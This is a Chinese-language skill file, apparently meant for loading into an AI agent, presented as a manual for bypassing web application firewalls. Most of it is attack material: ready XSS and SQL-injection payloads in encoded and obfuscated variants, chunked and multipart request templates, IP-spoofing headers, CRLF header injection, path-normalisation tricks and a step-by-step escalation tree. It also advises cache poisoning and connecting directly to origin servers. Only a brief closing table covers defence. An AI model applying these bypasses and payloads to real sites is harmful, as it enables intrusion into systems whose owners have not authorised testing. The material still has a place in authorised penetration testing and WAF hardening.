# 技能：WAF绕过技术 — 漏洞利用手册

> **AI加载指令**：涵盖WAF识别、通用绕过类别（编码、协议滥用、HTTP/2、参数污染）以及决策树。针对特定产品的绕过（Cloudflare、AWS WAF、ModSecurity、Akamai等），加载[WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md)。基础模型通常建议基本编码绕过，但会遗漏协议级绕过和WAF行为特性。

## 0. 相关路由

- [sqli-sql注入](../sqli-sql-injection/SKILL.md) 用于绕过WAF后传递载荷
- [xss跨站脚本](../xss-cross-site-scripting/SKILL.md) 用于需要绕过WAF的XSS载荷
- [request-smuggling请求走私](../request-smuggling/SKILL.md) 当走私可以完全绕过WAF时使用
- [http-parameter-pollutionHTTP参数污染](../http-parameter-pollution/SKILL.md) HPP本身就是一种WAF绕过原语
- [csp-bypass-advanced高级CSP绕过](../csp-bypass-advanced/SKILL.md) 当WAF阻止内联脚本但CSP绕过可用时使用
- [ghost-bits-cast攻击](../ghost-bits-cast-attack/SKILL.md) **仅限Java后端** — 当上述所有编码技巧都被阻止时，使用Ghost Bits：Java的16位`char`到8位`byte`的窄化会产生每个危险ASCII字节255个Unicode绕过变体；重新启用Tomcat、Spring、Jetty、Jackson、Fastjson、BCEL等WAF修补的CVE

### 产品特定参考

当您需要Cloudflare、AWS WAF、ModSecurity CRS、Akamai、Imperva、F5 BIG-IP或Sucuri的每个产品绕过技术时，加载[WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md)。

---

## 1. 阶段0 — 识别WAF

绕过之前，了解您在对抗什么。

### 1.1 工具

| 工具 | 使用方式 |
|---|---|
| `wafw00f target.com` | 从响应头/行为中识别WAF供应商指纹 |
| `nmap --script=http-waf-detect` | 用于WAF检测的NSE脚本 |
| 手动头检查 | `Server`、`X-CDN`、`X-Cache`、`cf-ray`（Cloudflare）、`x-sucuri-id`、`x-akamai-*` |

### 1.2 行为指纹识别

```
1. 发送良性请求 → 记录基线响应（状态、头、体大小）
2. 发送明显攻击：/?q=<script>alert(1)</script>
3. 比较：403？自定义阻止页面？重定向？连接重置？
4. 阻止页面内容揭示WAF："Cloudflare"、"Access Denied (Imperva)"、"ModSecurity"
5. 如果是透明代理：检查响应时间差异（WAF增加延迟）
```

---

## 2. 通用绕过类别

### 2.1 编码绕过

| 技巧 | 示例 | 绕过 |
|---|---|---|
| URL编码 | `%3Cscript%3E` | 基本字符串匹配 |
| 双URL编码 | `%253Cscript%253E` | 解码一次的WAF，应用解码两次 |
| Unicode编码 | `%u003Cscript%u003E` | IIS特定的Unicode规范化 |
| HTML实体 | `&#60;script&#62;` 或 `&#x3c;script&#x3e;` | 未执行HTML实体解码的WAF |
| 十六进制编码（SQL） | `0x756E696F6E` = `union` | 匹配SQL关键词的WAF |
| 八进制编码 | `\74script\76` | 罕见但某些解析器处理它 |
| 过长的UTF-8 | `%C0%BC`（无效的`<`编码） | 具有宽松UTF-8处理的旧版解析器 |
| 混合大小写 | `SeLeCt`、`uNiOn` | 区分大小写的规则匹配 |
| 空字节 | `sel%00ect` | 停止解析空字节的WAF |

### 2.2 分块传输编码

将载荷分割到HTTP分块中，以便没有单个分块包含被阻止的模式：

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

检查完整体的WAF可能不会在匹配之前重新组装分块。

### 2.3 HTTP/2二进制格式绕过

HTTP/2将头作为HPACK编码的帧传输。某些WAF仅在降级到HTTP/1.1后检查：

- 头名可以包含HTTP/1.1中非法的字符
- 伪头（`:method`、`:path`）绕过基于头的WAF规则
- H2 → H1降级可能引入请求走私（见[request-smuggling](../request-smuggling/SKILL.md)）

### 2.4 HTTP参数污染（HPP）

不同服务器处理重复参数的方式不同：

| 服务器 | 对`?a=1&a=2`的行为 |
|---|---|
| PHP/Apache | 最后值：`a=2` |
| ASP.NET/IIS | 连接：`a=1,2` |
| Python/Flask | 第一个值：`a=1` |
| Node.js/Express | 数组：`a=[1,2]` |

WAF检查`a=1`（良性），应用使用`a=2`（恶意）。或者组合：`a=sel&a=ect` → ASP.NET看到`a=sel,ect`。

### 2.5 IP源欺骗（绕过基于IP的规则）

某些WAF/应用信任的用于客户端IP的头：

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

用例：WAF白名单内部IP或按源具有不同规则集。

### 2.6 路径规范化技巧

| 技巧 | 示例 | 效果 |
|---|---|---|
| 点段 | `/./admin` 或 `../target/admin` | WAF看到不同路径，应用看到不同路径 |
| 双斜杠 | `//admin` | 某些规范化器会合并，WAF可能不会 |
| URL编码路径 | `/%61dmin` | WAF看到编码，应用解码 |
| 路径中的空字节 | `/admin%00.jpg` | 旧版：应用在空字节处截断，WAF看到.jpg |
| 反斜杠（IIS） | `/admin\..\/secret` | IIS将`\`视为`/` |
| 尾随点/空格 | `/admin.` 或 `/admin%20` | 操作系统级规范化（Windows） |
| 分号（Tomcat） | `/admin;jsessionid=x` | Tomcat在`;`后移除，WAF可能不会 |

### 2.7 内容类型操纵

WAF通常有特定格式的解析器。切换内容类型可以绕过规则：

```
默认：  Content-Type: application/x-www-form-urlencoded  → WAF解析参数
切换：   Content-Type: application/json  → WAF可能不解析JSON体
切换：   Content-Type: multipart/form-data  → WAF可能不检查所有部分
切换：   Content-Type: text/xml  → WAF期望XML，载荷格式不同
```

**技巧**：如果应用接受JSON和form-urlencoded，使用JSON — WAF通常有较弱的JSON检查规则。

### 2.8 多部分边界滥用

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

变体：长边界字符串、带特殊字符的边界、缺少最终边界、嵌套多部分。

### 2.9 换行符和空白字符注入

```sql
-- SQL关键字分割
SEL
ECT * FROM users

-- SQL注释插入
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/垂直Tab作为分隔符
SELECT\t*\tFROM\tusers
```

### 2.10 关键字分割和替代语法

| 被阻止 | 替代 |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`、`UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`、`OR 'a'='a'`、`||1` |
| `<script>` | `<svg/onload=alert(1)>`、`<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`、`confirm(1)`、`print()`（Chrome） |
| `eval()` | `Function('code')()`、`setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`、`'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`、`pg_sleep(5)` |

---

## 3. 协议级绕过技巧

### 3.1 请求行滥用

```http
GET /path?q=attack HTTP/1.1    ← WAF检查
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← 绝对URI：某些WAF会忽略路径
```

### 3.2 通过CRLF进行头注入

如果WAF检查原始头但应用处理注入的头：

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 连接状态绕过

```
1. 通过WAF建立连接（正常请求）
2. 在同一keep-alive连接上发送攻击请求
3. 某些WAF在相同连接中的后续请求上减少检查
```

---

## 4. WAF绕过决策树

```
载荷被WAF阻止？
├── 识别WAF（wafw00f、响应头、阻止页面）
│
├── 尝试编码绕过
│   ├── URL编码载荷 → 仍然被阻止？
│   ├── 双URL编码 → 仍然被阻止？
│   ├── Unicode/过长的UTF-8 → 仍然被阻止？
│   ├── 混合大小写关键字 → 仍然被阻止？
│   └── HTML实体（用于XSS） → 仍然被阻止？
│
├── 尝试协议级绕过
│   ├── 切换内容类型（JSON、多部分、XML）
│   │   └── 应用接受替代格式？ → 重新发送载荷
│   ├── HTTP参数污染（重复参数）
│   ├── 分块传输编码以分割载荷
│   ├── 如果可用，直接使用HTTP/2（二进制帧绕过）
│   └── 请求行：绝对URI格式
│
├── 尝试基于路径的绕过
│   ├── 路径规范化（/./路径、//路径、;参数）
│   ├── 不同的HTTP方法（POST vs PUT vs PATCH）
│   └── 提供相同功能的替代端点
│
├── 尝试载荷变异
│   ├── SQL：注释（/**/）、替代函数、十六进制字面量
│   ├── XSS：替代标签/事件、JS模板字面量
│   ├── RCE：通配符滥用、字符串连接、变量扩展
│   └── 检查WAF_PRODUCT_MATRIX.md以获取供应商特定变异
│
├── 尝试IP源绕过
│   ├── X-Forwarded-For / True-Client-IP欺骗
│   ├── 直接访问源服务器（绕过CDN）
│   └── 查找源IP（Shodan、历史DNS、邮件头）
│
└── 尝试请求走私以完全绕过WAF
    └── 见../request-smuggling/SKILL.md
```

---

## 5. 常见错误和技巧笔记

1. **使用实际利用测试绕过，而不仅仅是200 OK**：WAF可能返回200但无声地剥离载荷。
2. **WAF通常有大小限制**：非常大的请求体（>8KB–128KB，取决于WAF）可能完全绕过检查。
3. **速率限制≠WAF**：收到429表示速率限制，不是载荷阻止。需要不同的绕过方法。
4. **CDN缓存**：如果WAF在CDN级别，缓存的响应在后续请求中绕过WAF。用干净请求中毒缓存，然后利用缓存。
5. **直接访问源服务器**：如果您找到CDN/WAF后面的源IP，直接连接 — 完全绕过WAF。
6. **多部分文件上传字段**：WAF通常会跳过多部分上传中文件内容的检查 — 如果反射，将载荷嵌入文件名或文件内容。

---

## 6. 防御视角

| 措施 | 备注 |
|---|---|
| WAF + 应用级输入验证 | WAF只是一个层，不是解决方案 |
| 参数化查询 | 无论WAF如何，消除SQLi |
| CSP + 输出编码 | 无论WAF如何，消除XSS |
| 定期更新WAF规则 | 供应商签名落后于新的绕过 |
| 默认拒绝，而不是阻止列表 | 允许列表有效输入模式 |
| 记录并警报WAF阻止 | 绕过尝试在日志中可见 |
